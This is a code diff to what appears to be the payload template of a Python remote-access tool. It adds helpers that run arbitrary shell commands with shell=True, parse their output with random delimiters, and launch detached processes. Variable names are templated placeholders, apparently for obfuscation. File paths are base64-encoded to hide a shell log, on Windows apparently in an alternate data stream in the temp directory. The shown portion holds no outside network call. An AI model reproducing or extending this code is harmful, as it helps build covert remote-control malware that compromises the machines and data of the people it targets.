@@ -207,6 +207,9 @@ import StringIO
 import platform
 import threading
 import subprocess
+import random
+import string
+import tempfile
 from st_protocol import *
 from st_encryption import *
 from mss import exception
@@ -221,6 +224,20 @@ T = False
 {3} = send
 {6} = sys.platform
 
+
+def extract_run_command({4},count=1):
+    ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 5))
+    {4} = {4}.replace('%s', ran_str)
+    response = run_command({4}).strip()
+    if response != '' and not response.startswith('[!]'):
+        group_res = response.split(ran_str)
+        if len(group_res)>=3:
+            if count == 1:
+                return group_res[1]
+            else:
+                return group_res[1:len(group_res)-1]
+    return response
+
 def run_command({4}):
     subp = sp.Popen({4},shell=True,stdout=sp.PIPE,stderr=sp.PIPE)
     {0}, {5} = subp.communicate()
@@ -231,9 +248,9 @@ def run_command({4}):
             return {0}
     return "[!] {{}}".format({5})
 
-def start_command(command):
+def start_command({4}):
     try:
-        subp = sp.Popen(command, shell=True,
+        subp = sp.Popen({4}, shell=True,
              stdin=None, stdout=None, stderr=None, close_fds=True)
         return '[+] Command successfully started.\\n'
     except Exception as e:
@@ -331,7 +348,7 @@ def stitch_running():
     if {9}.endswith('.py') or {9}.endswith('.pyc'):
         {9} = 'python.exe'
     if win_client():
-        {7} = base64.b64decode('QzpcV2luZG93c1xUZW1wXHRtcDpzdHNoZWxsLmxvZw==')
+        {7} = tempfile.gettempdir() + base64.b64decode('OnN0c2hlbGwubG9n')
     else:
         {7} = base64.b64decode('L3RtcC8uc3RzaGVsbC5sb2c=')
     if os.path.exists({7}):
